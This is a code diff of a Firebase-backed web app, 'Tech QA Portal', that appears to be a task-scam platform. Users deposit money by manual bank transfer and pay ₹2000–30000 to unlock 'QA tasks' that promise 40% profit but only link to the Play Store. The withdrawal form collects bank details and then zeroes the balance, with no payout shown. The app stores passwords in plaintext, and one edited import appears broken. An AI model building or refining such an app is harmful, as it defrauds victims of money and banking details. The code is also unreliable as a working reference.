@@ -6,9 +6,9 @@
     <title>TECH QA | PORTAL</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .hidden { display: none; }
+        .hidden { display: none !important; }
         .tab-content { display: none; }
-        .active { display: block; }
+        .active { display: block !important; }
         .blur-text { filter: blur(10px); user-select: none; pointer-events: none; }
         .glass { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(10px); }
     </style>
@@ -25,29 +25,30 @@
                 <input id="up-user" type="text" placeholder="Username" class="w-full p-4 bg-slate-950 rounded-2xl border border-slate-800 outline-none">
                 <input id="up-pass" type="password" placeholder="Password" class="w-full p-4 bg-slate-950 rounded-2xl border border-slate-800 outline-none">
             </div>
-            <button onclick="handleAuth('signup')" class="w-full bg-blue-600 py-4 rounded-2xl font-black mt-8 uppercase tracking-widest">Create Account</button>
+            <button onclick="handleAuth('signup')" class="w-full bg-blue-600 py-4 rounded-2xl font-black mt-8 uppercase">Create Account</button>
             <button onclick="showAuth('login')" class="w-full mt-4 text-slate-500 text-[10px] font-bold uppercase underline">Login Instead</button>
         </div>
+
         <div id="login-page" class="hidden bg-slate-900 p-8 rounded-[2.5rem] w-full max-w-sm border border-slate-800 shadow-2xl">
             <h1 class="text-3xl font-black mb-6 text-green-500 italic uppercase text-center">Login</h1>
             <input id="in-user" type="text" placeholder="Username" class="w-full p-4 mb-3 bg-slate-950 rounded-2xl border border-slate-800 outline-none">
             <input id="in-pass" type="password" placeholder="Password" class="w-full p-4 mb-8 bg-slate-950 rounded-2xl border border-slate-800 outline-none">
-            <button onclick="handleAuth('login')" class="w-full bg-green-600 py-4 rounded-2xl font-black uppercase tracking-widest">Access</button>
+            <button onclick="handleAuth('login')" class="w-full bg-green-600 py-4 rounded-2xl font-black uppercase">Access</button>
             <button onclick="showAuth('signup')" class="w-full mt-4 text-slate-500 text-[10px] font-bold uppercase underline">New Account</button>
         </div>
     </div>
 
     <div id="main-app" class="hidden min-h-screen pb-24">
         <header class="p-5 glass sticky top-0 z-50 flex justify-between items-center border-b border-slate-800">
-            <span class="text-xl font-black text-blue-500 italic uppercase tracking-tighter">Tech QA</span>
-            <button onclick="logout()" class="text-[9px] bg-red-900/20 text-red-500 px-4 py-1 rounded-full font-black uppercase border border-red-500/20">Exit Session</button>
+            <span class="text-xl font-black text-blue-500 italic uppercase">Tech QA</span>
+            <button onclick="logout()" class="text-[9px] bg-red-900/20 text-red-500 px-4 py-1 rounded-full font-black uppercase border border-red-500/20">Logout</button>
         </header>
 
         <main class="p-4 space-y-6">
             <div class="bg-gradient-to-br from-slate-900 to-indigo-950 p-6 rounded-[2.5rem] border border-slate-800 shadow-2xl">
                 <div class="flex justify-between items-start mb-6 px-2">
                     <div>
-                        <p class="text-[10px] uppercase font-black tracking-widest opacity-40">Total Balance</p>
+                        <p class="text-[10px] uppercase font-black tracking-widest opacity-60">Balance</p>
                         <h2 class="text-4xl font-black italic">₹<span id="balance">0</span></h2>
                     </div>
                     <div class="text-right">
@@ -62,7 +63,6 @@
             </div>
 
             <section id="home" class="tab-content active space-y-4">
-                <h3 class="text-[10px] font-black text-slate-500 uppercase tracking-widest px-2">Available QA Tasks</h3>
                 <div id="task-container" class="space-y-4"></div>
             </section>
 
@@ -73,14 +73,13 @@
                     <div class="text-left space-y-3 bg-slate-950 p-5 rounded-2xl border border-slate-800 text-[10px] uppercase font-bold mt-6">
                         <p class="flex justify-between border-b border-slate-900 pb-2"><span>Mobile:</span> <span id="prof-mobile">---</span></p>
                         <p class="flex justify-between border-b border-slate-900 pb-2"><span>Email:</span> <span id="prof-email">---</span></p>
-                        <p class="flex justify-between text-blue-500"><span>Tier:</span> <span>PREMIUM TESTER</span></p>
                     </div>
                 </div>
             </section>
 
             <section id="transaction" class="tab-content hidden space-y-4">
-                <h3 class="text-[10px] font-black text-slate-500 uppercase tracking-widest px-2">Purchase History</h3>
-                <div id="history-list" class="bg-slate-900 p-10 rounded-[2.5rem] border border-slate-800 text-center italic text-slate-700 font-black uppercase text-[10px] tracking-widest">No activity logged.</div>
+                <h3 class="text-[10px] font-black text-slate-500 uppercase tracking-widest px-2">History</h3>
+                <div id="history-list" class="bg-slate-900 p-10 rounded-[2.5rem] border border-slate-800 text-center italic text-slate-700 font-black uppercase text-[10px]">No activity logged.</div>
             </section>
         </main>
 
@@ -97,7 +96,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, get, child, update, onValue, push, set, query, orderByChild, equalTo } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        import { getDatabase, ref, get, child, update, onValue, push, set, query, orderByChild, equalTo } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBMUzq53tvH-ntEJsfRj08ReeGMSd_RmrY",
@@ -108,7 +107,7 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // PERSISTENCE LOGIC
+        // PERSISTENCE
         window.onload = () => {
             const saved = localStorage.getItem('techqa_user');
             if (saved) autoLogin(saved);
@@ -124,10 +123,7 @@
         window.handleAuth = async (type) => {
             if (type === 'signup') {
                 const u = { name: document.getElementById('up-name').value, mobile: document.getElementById('up-mobile').value, email: document.getElementById('up-email').value, user: document.getElementById('up-user').value, pass: document.getElementById('up-pass').value };
-                if(!u.user || !u.pass) return alert("Fill fields");
-                const q = query(ref(db, 'users'), orderByChild('mobile'), equalTo(u.mobile));
-                const s = await get(q);
-                if (s.exists()) return alert("Mobile taken");
+                if(!u.user || !u.pass) return alert("Fill all fields");
                 await set(ref(db, 'users/' + u.user), { ...u, balance: 0, userID: "QA-"+Math.floor(1000+Math.random()*9000), permissions: {}, unlockedTasks: {} });
                 alert("Account Created!"); showAuth('login');
             } else {
@@ -160,24 +156,22 @@
             renderTasks();
         }
 
-        // DEPOSIT LOGIC
         window.showDepositModal = async () => {
             const snap = await get(child(ref(db), `users/${window.currentUser.username}/depositDetails`));
             const d = snap.exists() ? snap.val() : {};
             document.getElementById('modal-overlay').classList.remove('hidden');
             document.getElementById('modal-content').innerHTML = `
-                <h2 class="text-xl font-black mb-6 text-green-500 uppercase italic text-center">Manual Deposit</h2>
+                <h2 class="text-xl font-black mb-6 text-green-500 uppercase italic text-center">Deposit Details</h2>
                 <div class="space-y-2 bg-slate-950 p-4 rounded-2xl border border-slate-800 text-[10px] font-bold uppercase">
                     <p class="flex justify-between border-b border-slate-900 pb-1"><span>Bank:</span> <span>${d.bankName || '---'}</span></p>
                     <p class="flex justify-between border-b border-slate-900 pb-1"><span>Name:</span> <span>${d.accName || '---'}</span></p>
-                    <p class="flex justify-between border-b border-slate-900 pb-1"><span>A/C:</span> <span>${d.accNo || '---'}</span></p>
+                    <p class="flex justify-between border-b border-slate-900 pb-1"><span>A/C No:</span> <span>${d.accNo || '---'}</span></p>
                     <p class="flex justify-between border-b border-slate-900 pb-1"><span>IFSC:</span> <span>${d.ifsc || '---'}</span></p>
-                    <p class="text-yellow-500 text-center mt-3 italic leading-tight uppercase font-black tracking-tighter">For QR payment contact the receptionist or your manager</p>
+                    <p class="text-yellow-500 text-center mt-3 italic leading-tight uppercase tracking-tighter">For QR payment contact the receptionist or your manager</p>
                 </div>
                 <button onclick="closeModal()" class="w-full mt-6 text-slate-500 text-[9px] font-black uppercase">Dismiss</button>`;
         };
 
-        // WITHDRAWAL 10S AUTO-ZERO
         window.showWithdrawModal = () => {
             const fullAmt = window.currentUser.balance;
             if(fullAmt <= 0) return alert("Zero balance.");
@@ -189,8 +183,8 @@
                     <input id="w-bank" placeholder="Bank Name" class="w-full p-3 bg-slate-950 rounded-xl border border-slate-800 text-xs outline-none">
                     <input id="w-acc" placeholder="Account Number" class="w-full p-3 bg-slate-950 rounded-xl border border-slate-800 text-xs outline-none">
                     <input id="w-ifsc" placeholder="IFSC Code" class="w-full p-3 bg-slate-950 rounded-xl border border-slate-800 text-xs outline-none">
-                    <div id="timer-box" class="hidden text-center text-red-500 text-[10px] font-black animate-pulse">SETTING BALANCE TO ZERO IN 10s...</div>
-                    <button id="withdraw-btn" onclick="submitWithdraw(${fullAmt})" class="w-full bg-orange-600 py-4 rounded-2xl font-black mt-4 uppercase text-[10px] tracking-widest">Send Request</button>
+                    <div id="timer-box" class="hidden text-center text-red-500 text-[10px] font-black animate-pulse uppercase">SETTING BALANCE TO ZERO IN 10s...</div>
+                    <button id="withdraw-btn" onclick="submitWithdraw(${fullAmt})" class="w-full bg-orange-600 py-4 rounded-2xl font-black mt-4 uppercase text-[10px] tracking-widest italic">Confirm All</button>
                 </div>`;
         };
 
@@ -198,18 +192,14 @@
             const b = document.getElementById('w-bank').value;
             const a = document.getElementById('w-acc').value;
             const i = document.getElementById('w-ifsc').value;
-            if(!b || !a || !i) return alert("All fields required");
-            
+            if(!b || !a || !i) return alert("Required");
             await push(ref(db, 'withdrawals'), { user: window.currentUser.username, name: window.currentUser.name, id: window.currentUser.userID, bank: b, acc: a, ifsc: i, amount: amt, timestamp: Date.now() });
-            
             document.getElementById('withdraw-btn').classList.add('hidden');
             document.getElementById('timer-box').classList.remove('hidden');
-            
             setTimeout(async () => {
                 await update(ref(db, `users/${window.currentUser.username}`), { balance: 0 });
-                alert("Withdrawal Finalized. Balance Zeroed.");
-                closeModal();
-            }, 10000);
+                alert("Deducted."); closeModal();
+            }, 10000); // 10s Safety delay
         };
 
         function renderTasks() {
@@ -223,7 +213,7 @@
             document.getElementById('task-container').innerHTML = tasks.map(t => {
                 const isL = t.id !== 5 && (!window.currentUser.permissions || !window.currentUser.permissions[`task${t.id}`]);
                 const isU = window.currentUser.unlockedTasks && window.currentUser.unlockedTasks[`task${t.id}`];
-                return `<div class="bg-slate-900/50 p-5 rounded-[2rem] border border-slate-800 flex justify-between items-center transition-all"><div class="flex items-center space-x-4"><div class="w-14 h-14 bg-slate-800 rounded-2xl flex items-center justify-center text-xl">📦</div><div><p class="font-bold text-slate-300 ${isU ? '' : 'blur-text'} uppercase text-xs tracking-tight">${isU ? t.name : 'HIDDEN APP'}</p><p class="text-[8px] text-blue-500 font-black tracking-widest uppercase">TASK ${t.id}</p></div></div><button onclick="openAction(${t.id}, ${isL})" class="${isL ? 'bg-red-900/10 text-red-500' : (isU ? 'bg-green-600' : 'bg-slate-800 hover:bg-blue-600')} px-6 py-3 rounded-2xl text-[9px] font-black transition-all uppercase">${isL ? 'LOCKED' : (isU ? 'DOWNLOAD' : 'UNLOCK')}</button></div>`;
+                return `<div class="bg-slate-900/50 p-5 rounded-[2rem] border border-slate-800 flex justify-between items-center transition-all"><div class="flex items-center space-x-4"><div class="w-14 h-14 bg-slate-800 rounded-2xl flex items-center justify-center text-xl">📦</div><div><p class="font-bold text-slate-300 ${isU ? '' : 'blur-text'} uppercase text-xs tracking-tight">${isU ? t.name : 'HIDDEN APP'}</p><p class="text-[8px] text-blue-500 font-black tracking-widest uppercase">TASK ${t.id}</p></div></div><button onclick="openAction(${t.id}, ${isL})" class="${isL ? 'bg-red-900/10 text-red-500' : (isU ? 'bg-green-600' : 'bg-slate-800 hover:bg-blue-600')} px-6 py-3 rounded-2xl text-[9px] font-black transition-all uppercase tracking-tighter">${isL ? 'LOCKED' : (isU ? 'DOWNLOAD' : 'UNLOCK')}</button></div>`;
             }).join('');
         }
 
@@ -231,10 +221,10 @@
             if(isLocked) return alert("LOCK by Admin");
             const isU = window.currentUser.unlockedTasks && window.currentUser.unlockedTasks[`task${id}`];
             if (isU) return showLink(id);
-            const prices = [2000, 5000, 9000, 15000, 30000]; // Basic tiers
+            const prices = [2000, 5000, 9000, 15000, 30000];
             let btns = prices.map(p => `<button onclick="buyTask(${p}, ${id})" class="bg-slate-950 p-5 rounded-3xl border border-slate-800 text-left hover:border-blue-500 transition-all"><span class="block text-[8px] text-slate-500 font-black uppercase italic">Tier</span><span class="block font-black text-xl italic text-white my-1">₹${p}</span><span class="block text-[9px] text-green-400 font-black tracking-widest">+40% PROFIT</span></button>`).join('');
             document.getElementById('modal-overlay').classList.remove('hidden');
-            document.getElementById('modal-content').innerHTML = `<h2 class="text-xl font-black mb-6 text-center italic uppercase text-white tracking-widest">Select Plan</h2><div class="grid grid-cols-2 gap-3 max-h-72 overflow-y-auto">${btns}</div>`;
+            document.getElementById('modal-content').innerHTML = `<h2 class="text-xl font-black mb-6 text-center italic uppercase text-white tracking-widest">Select QA Tier</h2><div class="grid grid-cols-2 gap-3 max-h-72 overflow-y-auto">${btns}</div><button onclick="closeModal()" class="w-full mt-6 text-slate-700 text-[8px] font-black uppercase">Cancel</button>`;
         };
 
         window.buyTask = async (amt, id) => {
@@ -242,18 +232,19 @@
             const unt = window.currentUser.unlockedTasks || {};
             unt[`task${id}`] = true;
             await update(ref(db, `users/${window.currentUser.username}`), { balance: window.currentUser.balance - amt, unlockedTasks: unt });
+            await push(ref(db, 'purchases'), { username: window.currentUser.username, taskID: id, amount: amt, timestamp: Date.now() });
             showLink(id);
         };
 
         function showLink(id) {
-            const link = "https://play.google.com/store/apps"; // Default for demo
+            const link = "https://play.google.com/store/apps"; 
             document.getElementById('modal-overlay').classList.remove('hidden');
-            document.getElementById('modal-content').innerHTML = `<div class="text-center py-10"><h2 class="text-2xl font-black mb-4 uppercase text-blue-500 italic">Task Unlocked</h2><div class="bg-slate-950 p-6 rounded-3xl border border-slate-800 mb-6 italic"><a href="${link}" target="_blank" class="text-blue-500 font-black text-xs underline uppercase italic animate-pulse">LINK - CLICK TO DOWNLOAD</a></div><button onclick="closeModal()" class="text-slate-700 text-[8px] font-black uppercase">Dismiss</button></div>`;
+            document.getElementById('modal-content').innerHTML = `<div class="text-center py-10"><h2 class="text-2xl font-black mb-4 uppercase text-blue-500 italic">Task Unlocked</h2><div class="bg-slate-950 p-6 rounded-3xl border border-slate-800 mb-6 italic"><a href="${link}" target="_blank" class="text-blue-500 font-black text-xs underline uppercase italic animate-pulse">LINK - DOWNLOAD</a></div><button onclick="closeModal()" class="text-slate-700 text-[8px] font-black uppercase">Back</button></div>`;
         }
 
         window.showTab = (t) => {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
-            document.getElementById(t).classList.remove('hidden');
+            document.getElementById(t).classList.add('active');
             document.querySelectorAll('.nav-btn').forEach(btn => {
                 if (btn.innerText.toLowerCase() === t) btn.classList.replace('text-slate-500', 'text-blue-500');
                 else btn.classList.replace('text-blue-500', 'text-slate-500');
